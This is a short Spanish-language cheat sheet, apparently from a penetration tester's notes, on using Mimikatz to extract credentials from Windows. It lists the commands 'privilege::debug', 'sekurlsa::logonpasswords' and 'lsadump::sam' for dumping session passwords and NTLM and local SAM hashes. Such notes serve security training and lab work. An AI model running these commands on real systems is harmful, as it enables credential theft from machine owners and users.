
----
- Tags: #Herramienta #Windows #Post-exploitation #Hashes #Attacks 
- --- 

# Qué es? 

**Mimikatz** es una **herramienta de post-explotación** creada por _Benjamin Delpy_ que permite **extraer credenciales y secretos de autenticación en Windows**.

## Ubicación:

```bash
/usr/share/windows-resources/mimikatz/
```

# 1. Uso

**Una vez que ya estamos en la máquina Windows con el ejecutable**.

```cmd
.\mimikatz.exe
```

Habilitamos los privilegios necesarios. 

```cmd
privilege::debug
```

_Si nos devuelve: 'Privilege 20 OK'_ tenemos los privilegios necesarios para dumpear Hashes

**Extraer credenciales de sesiones**:

```cmd
sekurlsa::logonpasswords
```

**Salida típica:** usuarios, dominio, NTLM (a veces password).

**Extraer Hashes Locales:

```cmd
lsadump::sam
```

